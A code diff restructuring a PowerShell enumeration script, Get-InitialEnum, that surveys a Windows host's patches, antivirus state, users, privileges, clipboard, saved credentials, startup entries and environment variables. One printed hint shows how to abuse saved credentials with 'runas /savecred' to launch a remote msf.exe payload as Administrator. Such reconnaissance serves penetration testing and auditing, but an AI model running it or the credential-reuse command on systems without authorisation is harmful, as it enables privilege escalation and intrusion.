@@ -1,5 +1,5 @@
 <#
-.NAME 
+.NAME
     Get-InitialEnum
 
 
@@ -49,17 +49,119 @@ OUTPUTS
     Author: Rob Osborne
     Alias: tobor
     Contact: rosborne@osbornepro.com
-    https://roberthosborne.com/ 
+    https://roberthosborne.com/
 #>
 Function Get-InitialEnum {
     [CmdletBinding()]
         param()  # End param
-    
-    BEGIN 
+
+    BEGIN
+    {
+    Function Get-Driver {
+        [CmdletBinding()]
+            Param (
+                [Switch]$Unsigned,
+                [Switch]$Signed,
+                [Switch]$All)  # End param
+    BEGIN
     {
 
+        Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"
+
+    } # End of Begin section
+    PROCESS
+    {
+
+        If ($Signed)
+        {
+
+            Write-Verbose "Obtaining signed driver info..."
+            $DrvSig = DriverQuery -SI | Select-String -Pattern "True"
+
+            $DrvSig
+            "`n " + $DrvSig.count + " signed drivers, note TRUE column"
+
+        }  # End of If
+        ElseIf ($UnSigned)
+        {
+
+            Write-Verbose "Obtaining signed driver info..."
+            $DrvU = DriverQuery -SI | Select-String "False"
+
+            $DrvU
+            "`n " + $DrvU.count + " unsigned drivers, note FALSE column"
+
+        }  # End ElseIf
+        ElseIf ($All)
+        {
+
+            DriverQuery -SI
+
+        }  # End ElseIf
+        Else
+        {
+
+            DriverQuery
+
+        }  # End Else
+
+    } # End PROCESS
+
+    } # End Function Get-Driver
+
+
+    Function Get-AntiVirusProduct {
+        [CmdletBinding()]
+            param (
+                [Parameter(
+                    Mandatory=$False,
+                    Position=0,
+                    ValueFromPipeline=$True,
+                    ValueFromPipelineByPropertyName=$true)]
+        [Alias('Computer')]
+        [string]$ComputerName=$env:COMPUTERNAME )  # End param
+
+        $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName
+
+        $Ret = @()
+        ForEach ($AntiVirusProduct in $AntiVirusProducts)
+        {
+           #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
+            Switch ($AntiVirusProduct.productState)
+            {
+                "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
+                "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
+                "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
+                "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
+                "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
+                "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
+                "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
+                "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
+                "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
+                "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
+
+                Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
+            }  # End Switch
+
+            $HashTable = @{}
+            $HashTable.Computername = $ComputerName
+            $HashTable.Name = $AntiVirusProduct.DisplayName
+            $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
+            $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
+            $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
+            $HashTable.'Definition Status' = $DefStatus
+            $HashTable.'Real-time Protection Status' = $RtStatus
+
+            $Ret += New-Object -TypeName "PSObject" -Property $HashTable
+
+        }  # End ForEach
+
+        $Ret
+
+    }  # End Function Get-AntiVirusProduct
+
 }  # End BEGIN
-PROCESS 
+PROCESS
 {
 #================================================================
 #  SECURITY PATCHES
@@ -68,13 +170,13 @@ PROCESS
     Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser
 
     Write-Host "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" -ForegroundColor "Yellow"
-    Try 
+    Try
     {
-        
+
         Get-Hotfix -Description "Security Update"
 
     }  # End Try
-    Catch 
+    Catch
     {
 
         Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering' | Select-Object -Property HotFixID
@@ -99,7 +201,7 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 #==========================================================================
     Write-Host "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" -ForegroundColor "Yellow"
 
-    Get-AntiVirusProduct 
+    Get-AntiVirusProduct
 
 #==========================================================================
 #  USER, USER PRIVILEDGES, AND GROUP INFO
@@ -109,10 +211,10 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 
     Write-Host "=================================`n|       USER & GROUP LIST       |`n=================================" -ForegroundColor "Yellow"
     Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
-    Get-LocalGroup | Format-Table -Property "Name" 
+    Get-LocalGroup | Format-Table -Property "Name"
 
     Write-Host "=================================`n|  CURRENT USER PRIVS   |`n=================================" -ForegroundColor "Yellow"
-    whoami /priv 
+    whoami /priv
 
     Write-Host "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" -ForegroundColor "Yellow"
     Get-ChildItem -Path C:\Users | Select-Object -Property "Name"
@@ -121,12 +223,12 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
     Get-Clipboard
 
     Write-Host "=================================`n|  SAVED CREDENTIALS  |`n=================================" -ForegroundColor "Yellow"
-    cmdkey /list 
+    cmdkey /list
     Write-Host "If you find a saved credential it can be used issuing a command in the below format: "
     Write-Host 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
 
     Write-Host "=================================`n|  SIGNED IN USERS  |`n=================================" -ForegroundColor "Yellow"
-    qwinsta 
+    qwinsta
 
 #==========================================================================
 #  NETWORK INFORMATION
@@ -155,13 +257,13 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
     Write-Host "=================================`n| INSTALLED APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
 
     $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'
-      
+
     ForEach ($Path in $Paths)
     {
 
         Get-ChildItem -Path $Path | Get-ItemProperty | Select-Object -Property "DisplayName","Publisher","InstallDate","DisplayVersion" | Format-Table -AutoSize
 
-    }  # End ForEach 
+    }  # End ForEach
 
     Write-Host "=================================`n| STARTUP APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
     Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize
@@ -169,18 +271,18 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
     $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
     If ($StartupAppCurrentUser)
     {
-        
+
         Write-Host "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"
 
-    }  # End If 
+    }  # End If
 
     $StartupAppAllUsers = (Get-ChildItem -Path "C:\Users\All Users\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
     If ($StartupAppAllUsers)
     {
-        
+
         Write-Host "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"
 
-    }  # End If 
+    }  # End If
 
     Write-Host "Check below values for binaries you may be able to execute as another user."
     Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -198,109 +300,6 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
     Write-Host "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" -ForegroundColor "Yellow"
     Get-ChildItem -Path "Env:" | Format-Table -Property "Key","Value"
 
-}  # End PROCESS 
+}  # End PROCESS
 
 }  # End Function Get-InitialEnum
-
-Function Get-Driver {
-    [CmdletBinding()]
-        Param (
-            [Switch]$Unsigned,
-            [Switch]$Signed,
-            [Switch]$All)  # End param
-BEGIN 
-{
-    
-    Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"
-                  
-} # End of Begin section
-PROCESS 
-{
-  
-    If ($Signed)
-    {
-
-        Write-Verbose "Obtaining signed driver info..."
-        $DrvSig = DriverQuery -SI | Select-String -Pattern "True"
-
-        $DrvSig
-        "`n " + $DrvSig.count + " signed drivers, note TRUE column"
-        
-    }  # End of If
-    ElseIf ($UnSigned) 
-    {
-        
-        Write-Verbose "Obtaining signed driver info..."
-        $DrvU = DriverQuery -SI | Select-String "False"
-
-        $DrvU
-        "`n " + $DrvU.count + " unsigned drivers, note FALSE column"
-            
-    }  # End ElseIf
-    ElseIf ($All) 
-    {
-        
-        DriverQuery -SI
-        
-    }  # End ElseIf
-    Else 
-    {
-        
-        DriverQuery
-        
-    }  # End Else
-            
-} # End PROCESS
-
-} # End Function Get-Driver
-
-
-Function Get-AntiVirusProduct {
-    [CmdletBinding()]
-        param (
-            [Parameter(
-                Mandatory=$False,
-                Position=0,
-                ValueFromPipeline=$True, 
-                ValueFromPipelineByPropertyName=$true)]
-    [Alias('Computer')]
-    [string]$ComputerName=$env:COMPUTERNAME )  # End param
-
-    $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName
-
-    $Ret = @()
-    ForEach ($AntiVirusProduct in $AntiVirusProducts)
-    {
-       #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
-        Switch ($AntiVirusProduct.productState) 
-        {
-            "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
-            "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
-            "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
-            "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
-            "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
-            "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
-            "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
-            "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
-            "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
-            "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
-            
-            Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
-        }  # End Switch 
-
-        $HashTable = @{}
-        $HashTable.Computername = $ComputerName
-        $HashTable.Name = $AntiVirusProduct.DisplayName
-        $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
-        $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
-        $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
-        $HashTable.'Definition Status' = $DefStatus
-        $HashTable.'Real-time Protection Status' = $RtStatus
-
-        $Ret += New-Object -TypeName "PSObject" -Property $HashTable 
-
-    }  # End ForEach 
-        
-    $Ret
-
-}  # End Function Get-AntiVirusProduct
